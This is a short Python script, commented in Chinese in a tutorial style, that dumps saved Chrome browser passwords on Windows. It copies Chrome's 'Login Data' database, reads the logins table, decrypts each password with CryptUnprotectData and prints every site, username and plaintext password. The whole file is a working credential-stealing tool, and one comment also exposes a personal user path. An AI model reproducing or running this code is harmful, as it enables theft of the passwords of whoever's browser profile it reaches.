import os
import sqlite3
import sys
import shutil
import win32crypt

class get_info():
    def __init__(self):
        self.db_path = os.path.join(os.environ['LOCALAPPDATA'],r'Google\Chrome\User Data\Default\Login Data')#前面的方法os.path.join就是将
        #路径连接起来。os.environ['LOCALAPPDATA']，获取系统环境变量里面的C:\Users\user\AppData\Local文件夹，然后与后面的字符串连接就是用户登录名密码保存的文件
        self.temp_file = os.path.join(os.path.dirname(sys.executable),'tmp')#得到一个临时存储文件夹，目录为D:\Users\王竞生\AppData\Local\Programs\Python\Python36\tmp
        #因为db_path文件夹很重要，所以操作用临时文件夹操作
    def run(self):
        if os.path.exists(self.temp_file): #如果临时文件夹路径存在
            os.remove(self.temp_file) #移除文件路径
        shutil.copyfile(self.db_path,self.temp_file) #用self.temp_file覆盖self.db_path
        conn = sqlite3.connect(self.temp_file) #打开连接，连接到数据库文件
        for row in conn.execute('select signon_realm,username_value,password_value from logins'): #conn执行数据库语句得到结果集
            try:
                ret = win32crypt.CryptUnprotectData(row[2],None,None,None,0)#chrome以CryptUnprotectData来加密，以CryptUnprotectData方式还原密码
                print('Site:%-50s,usr:%-20s,pwd:%s' %(row[0][:50],row[1],ret[1].decode('gbk')) ) #网站以50位置显示，用户名以20个显示，密码直接显示
            except:
                print('[Fail]:Fail to get password...')
                continue
        conn.close()
        os.remove(self.temp_file) #移除临时文件夹


if __name__ == '__main__':
    get_info().run()